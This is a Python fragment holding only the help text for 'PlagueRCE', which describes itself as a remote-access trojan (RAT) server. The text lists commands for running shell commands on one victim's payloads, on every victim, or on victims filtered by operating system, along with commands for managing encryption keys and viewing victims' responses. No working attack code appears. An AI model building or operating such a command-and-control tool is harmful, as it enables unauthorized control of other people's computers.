# CLI help message
help_message: str = '''
Welcome to PlagueRCE, the ultimate RAT server

- Upon entering a command, if the command is a CLI command, it will be executed by the server
and not executed by the currently connected client.
- If the command is not a CLI command it will be executed by the currently connected client.
Ensure each CLI command entered is spelled correctly to prevent unwanted results.

/ escapes send options and CLI commands (e.g. /$command will have client execute $command)

Send command options
By default, commands are executed on the first payload on the currently connected client
$command: $ before a command to execute command on all payloads on currently connected client 
!command: ! before a command to execute command on first payload across all clients 
?command: ? before a command to execute command to execute command on all payloads across all clients 
*command: * before a command to execute the command on first payload on all clients using a particular OS
&command: & before a command to execute the command on all payloads across all clients using a particular OS

User help 
help: Show this message
quit: Exit the program

Encryption mode
current_keys: Display current server key pair if in encryption mode
encryption_mode: Enable encryption mode, and generate a new key pair
new_keys: Generate new server key pair (dangerous) or use own key pair
unencryption_mode: Disable encryption mode and delete existing key pair

Current connected client
current: Show client the user is currently connected to
current_client_OS: Display current connected client's operating system
current_latest: Show latest response from currently connected client
current_all: Show all responses from currently connected client
change: Change the current connected client

All connected clients
list: List all connected clients and their information
list_OS: Display all operating systems being used by clients
who_responded: Display list of all clients who have sent a response to server
responses_amount: Trigger temporary CLI to show specific amount of responses from a client
responses_latest: Trigger temporary CLI to show the latest response from a client
responses_all: Display all responses from all clients
responses_all_OS: Display all responses from all clients using a particular OS
'''.strip()